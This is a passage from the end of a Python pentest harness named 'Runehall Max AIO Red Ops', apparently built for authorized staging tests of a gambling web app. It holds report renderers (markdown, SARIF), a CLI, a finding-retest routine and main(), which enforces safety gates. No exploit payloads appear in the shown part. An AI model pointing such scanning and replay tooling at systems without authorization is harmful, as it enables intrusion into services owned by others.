        crit_high = sev_counts.get("CRITICAL", 0) + sev_counts.get("HIGH", 0)
        emoji = "\U0001F534" if crit_high else ("\U0001F7E1" if sev_counts.get("MEDIUM", 0) else "\U0001F7E2")
        lines = [
            f"### {emoji} Runehall Max AIO v{VERSION} \u2014 staging scan",
            "",
            f"**Score:** {score.get('score', '\u2014')}/{score.get('grade', '\u2014')} \u00b7 "
            f"**Critical:** {sev_counts.get('CRITICAL', 0)} \u00b7 **High:** {sev_counts.get('HIGH', 0)} \u00b7 "
            f"**Medium:** {sev_counts.get('MEDIUM', 0)} \u00b7 **Low:** {sev_counts.get('LOW', 0)}",
            "",
            f"**Since last run:** \U0001F195 {delta.get('new', 0)} new \u00b7 "
            f"\u267B\uFE0F {delta.get('existing', 0)} existing \u00b7 \u2705 {delta.get('fixed', 0)} fixed",
            "",
        ]
        top = [(c, f) for c, f in findings if str(f.get("severity")).upper() in ("CRITICAL", "HIGH")]
        if top:
            lines.append(f"<details><summary>Top CRITICAL/HIGH ({len(top)})</summary>\n")
            for c, f in top[:15]:
                tag = {"new": "\U0001F195 ", "existing": "\u267B\uFE0F "}.get(f.get("status"), "")
                lines.append(f"- {tag}**{f.get('severity')}** `{c}` \u2014 {f.get('detail') or f.get('name')}")
            lines.append("\n</details>")
        else:
            lines.append("_No CRITICAL/HIGH findings._")
        if fixed:
            lines.append("")
            lines.append(f"<details><summary>\u2705 Fixed since last run ({len(fixed)})</summary>\n")
            for fx in fixed[:15]:
                lines.append(f"- **{fx.get('severity')}** `{fx.get('category')}` \u2014 {fx.get('detail')}")
            lines.append("\n</details>")
        lines += [
            "",
            f"_Staging-only authorized scan of `{self.cfg.target_url}`. "
            f"RUN_STATEFUL={self.cfg.run_stateful}. Provably-fair checks are detection-only._",
            "",
        ]
        return "\n".join(lines) + "\n"

    def _render_sarif(self, findings: List[Tuple[str, Dict[str, Any]]]) -> Dict[str, Any]:
        """SARIF 2.1.0 for GitHub code scanning upload."""
        level_map = {
            "CRITICAL": "error", "HIGH": "error",
            "MEDIUM": "warning", "LOW": "note", "INFO": "note",
        }
        rules = {}
        results = []
        for idx, (cat, f) in enumerate(findings):
            rule_id = f"aio-v8/{cat}"
            if rule_id not in rules:
                rules[rule_id] = {
                    "id": rule_id,
                    "name": cat,
                    "shortDescription": {"text": cat.replace("_", " ").title()},
                    "fullDescription": {"text": f.get("owasp") or cat},
                    "helpUri": "https://staging.runehall.com",
                    "properties": {
                        "cwe": f.get("cwe", ""),
                        "owasp": f.get("owasp", ""),
                        "tags": ["security", "staging-authorized", cat],
                    },
                }
            sev = str(f.get("severity", "INFO")).upper()
            loc_uri = f.get("url") or f.get("matched_at") or self.cfg.target_url
            # SARIF wants a URI; keep as-is if absolute, else wrap
            if not str(loc_uri).startswith(("http://", "https://", "file:")):
                loc_uri = self.cfg.target_url
            results.append({
                "ruleId": rule_id,
                "level": level_map.get(sev, "note"),
                "message": {"text": str(f.get("detail") or f.get("name") or cat)},
                "locations": [{
                    "physicalLocation": {
                        "artifactLocation": {"uri": str(loc_uri)},
                    }
                }],
                "properties": {
                    "severity": sev,
                    "fix": f.get("fix", ""),
                    "verdict": f.get("verdict", ""),
                    "category": cat,
                    "cwe": f.get("cwe", ""),
                    "owasp": f.get("owasp", ""),
                },
            })
        return {
            "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
            "version": "2.1.0",
            "runs": [{
                "tool": {
                    "driver": {
                        "name": "Runehall Max AIO Red Ops",
                        "version": VERSION,
                        "informationUri": "https://staging.runehall.com",
                        "rules": list(rules.values()),
                    }
                },
                "invocations": [{
                    "executionSuccessful": True,
                    "commandLine": "python3 max_aio_v8.py",
                    "workingDirectory": {"uri": "file:///"},
                }],
                "results": results,
                "properties": {
                    "target": self.cfg.target_url,
                    "run_stateful": self.cfg.run_stateful,
                    "authorized_staging_only": True,
                },
            }],
        }

    def _render_markdown(self, findings: List[Tuple[str, Dict[str, Any]]], sev_counts: Dict[str, int]) -> str:
        score = self.report["summary"].get("scorecard", {})
        biz = self.report.get("business_logic") or {}
        lines = [
            f"# Max AIO Red Ops v{VERSION} — Executive Summary",
            "",
            f"**Target:** `{self.cfg.target_url}`  ",
            f"**When:** {self.report.get('timestamp')} → {self.report.get('completed_at')}  ",
            f"**Mode:** RUN_STATEFUL={self.cfg.run_stateful} | phases={','.join(self.report.get('phases_executed') or [])}  ",
            f"**Scope:** Staging-only authorized testing of the owner's Runehall SPA.  ",
            "",
            "## Scorecard",
            "",
            f"| Metric | Value |",
            f"|--------|-------|",
            f"| Score / Grade | {score.get('score', '—')} / {score.get('grade', '—')} |",
            f"| Total findings | {len(findings)} |",
            f"| CRITICAL | {sev_counts.get('CRITICAL', 0)} |",
            f"| HIGH | {sev_counts.get('HIGH', 0)} |",
            f"| MEDIUM | {sev_counts.get('MEDIUM', 0)} |",
            f"| LOW | {sev_counts.get('LOW', 0)} |",
            f"| INFO | {sev_counts.get('INFO', 0)} |",
            f"| Business-logic verdict | {biz.get('overall_verdict', '—')} |",
            f"| Since last run (new/existing/fixed) | "
            f"{(self.report.get('history_delta') or {}).get('new', 0)}/"
            f"{(self.report.get('history_delta') or {}).get('existing', 0)}/"
            f"{(self.report.get('history_delta') or {}).get('fixed', 0)} |",
            f"| API endpoints observed | {len(self.report.get('api_endpoints') or [])} |",
            f"| Subdomains | {len(self.report.get('subdomains') or [])} |",
            f"| Errors | {len(self.report.get('errors') or [])} |",
            "",
            "## Phase timing",
            "",
            "| Phase | Status | Duration | Reason |",
            "|-------|--------|----------|--------|",
        ]
        for p in self.report.get("phase_results", []):
            lines.append(
                f"| {p.get('name')} | {p.get('status')} | {p.get('duration_s', 0):.2f}s | {p.get('reason', '')} |"
            )
        lines += ["", "## Top issues (CRITICAL / HIGH)", ""]
        top = [(c, f) for c, f in findings if str(f.get("severity", "")).upper() in ("CRITICAL", "HIGH")]
        if not top:
            lines.append("_None._")
        else:
            for cat, f in top[:25]:
                lines.append(
                    f"- **{f.get('severity')}** `{cat}` — {f.get('detail') or f.get('name')}"
                    + (f"  \n  Remediation: {f.get('fix')}" if f.get("fix") else "")
                )
        lines += [
            "",
            "## Business-logic rollup (Kodak / scatter / provably-fair)",
            "",
            f"Overall: **{biz.get('overall_verdict', '—')}**  ",
            f"Verdicts: `{json.dumps(biz.get('verdict_breakdown', {}))}`  ",
            f"Severity: `{json.dumps(biz.get('severity_breakdown', {}))}`",
            "",
            "## Safety reminder",
            "",
            "This report was produced by a staging-only authorized harness. "
            "Do not retarget at production or third parties. "
            "Provably-fair checks are detection-only (no outcome prediction).",
            "",
        ]
        return "\n".join(lines) + "\n"


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def parse_args(argv: Optional[Sequence[str]] = None) -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description=f"Runehall Max AIO Red Ops v{VERSION} — staging-only authorized pentest harness",
    )
    p.add_argument(
        "--phases",
        default=None,
        help="Comma-separated phases: recon,passive,active_safe,stateful,all (or AIO_PHASES env)",
    )
    p.add_argument("--log-level", default=None, help="DEBUG|INFO|WARNING|ERROR (or AIO_LOG_LEVEL)")
    p.add_argument("--output-prefix", default=None, help="Report filename prefix (default max_aio_v8_report)")
    p.add_argument("--retest", default=None, metavar="FINDING_ID",
                   help="Re-run only the check behind a single finding id (from a prior run's history) and report whether it still reproduces.")
    p.add_argument("--history-file", default=None, help="Path to the run-history JSON (or AIO_HISTORY_FILE)")
    p.add_argument("--no-history", action="store_true", help="Do not read or write run history for this invocation")
    p.add_argument("--http2", action="store_true", help="Use HTTP/2 (httpx) transport if available (or AIO_HTTP2)")
    return p.parse_args(argv)


def run_retest(cfg: "AIOConfig", log: logging.Logger, finding_id: str) -> int:
    """Verify a single prior finding by re-running its owning phase (and a direct
    HTTP replay when the stored finding carries a replay descriptor)."""
    harness = MaxRedOpsHarness(cfg, log)
    hist = harness._load_history()
    target = None
    for run in reversed(hist.get("runs", [])):
        for fr in run.get("findings", []):
            if fr.get("id") == finding_id:
                target = fr
                break
        if target:
            break
    if not target:
        log.error("Finding id %s not found in history (%s). Run a full scan first.",
                  finding_id, cfg.history_file)
        return EXIT_CONFIG_ERROR

    log.info("Retesting %s [%s] %s", finding_id, target.get("category"), target.get("detail"))
    replay = target.get("replay")
    direct = None
    if replay and (replay.get("path") or target.get("url")):
        direct = harness._replay_http(target, replay)

    phase = CATEGORY_PHASE.get(target.get("category"), "active_safe")
    harness.preflight_check()
    try:
        asyncio.run(harness._run_phase(phase, [phase]))
    except Exception as e:
        log.exception("Retest phase %s failed: %s", phase, e)
        return EXIT_RUNTIME_ERROR
    # stamp ids without touching history
    for cat in harness.REPORT_CATEGORIES:
        if cat in ("api_endpoints", "subdomains"):
            continue
        for item in harness.report.get(cat, []):
            if isinstance(item, dict):
                item["id"] = harness._finding_id(cat, item)
    reproduced = any(
        isinstance(i, dict) and i.get("id") == finding_id
        for cat in harness.REPORT_CATEGORIES if cat not in ("api_endpoints", "subdomains")
        for i in harness.report.get(cat, [])
    )
    phase_verdict = "STILL-PRESENT" if reproduced else "NOT-REPRODUCED"
    direct_verdict = "n/a" if direct is None else ("STILL-PRESENT" if direct else "LIKELY-FIXED")
    log.info("RETEST RESULT: phase-reproduction=%s | direct-replay=%s", phase_verdict, direct_verdict)
    print(json.dumps({
        "finding_id": finding_id,
        "category": target.get("category"),
        "phase": phase,
        "detail": target.get("detail"),
        "phase_reproduction": phase_verdict,
        "direct_replay": direct_verdict,
    }, indent=2))
    return EXIT_FINDINGS_HIGH if (reproduced or direct) else EXIT_OK


def main(argv: Optional[Sequence[str]] = None) -> int:
    args = parse_args(argv)
    phases_cli = None
    if args.phases:
        phases_cli = [x.strip() for x in args.phases.split(",") if x.strip()]

    cfg = AIOConfig.from_env(phases_cli=phases_cli)
    if args.log_level:
        cfg.log_level = args.log_level
    if args.output_prefix:
        cfg.output_prefix = args.output_prefix
    if args.history_file:
        cfg.history_file = args.history_file
    if args.no_history:
        cfg.enable_history = False
    if args.http2:
        cfg.http2 = True
    if args.retest:
        cfg.retest_id = args.retest.strip()

    # Safety gates BEFORE any network I/O
    try:
        enforce_safety_gates(cfg)
    except SystemExit as e:
        # Preserve explicit refuse messages
        print(str(e) if e.args else "Authorization failed.", file=sys.stderr)
        return EXIT_AUTH_REFUSED

    log = setup_logging(cfg.log_level)
    if cfg.retest_id:
        return run_retest(cfg, log, cfg.retest_id)
    harness = MaxRedOpsHarness(cfg, log)
    try:
        return asyncio.run(harness.execute())
    except KeyboardInterrupt:
        log.warning("Interrupted.")
        return EXIT_RUNTIME_ERROR
    except Exception as e:
        log.exception("Unhandled error: %s", e)
        return EXIT_RUNTIME_ERROR


if __name__ == "__main__":
    sys.exit(main())
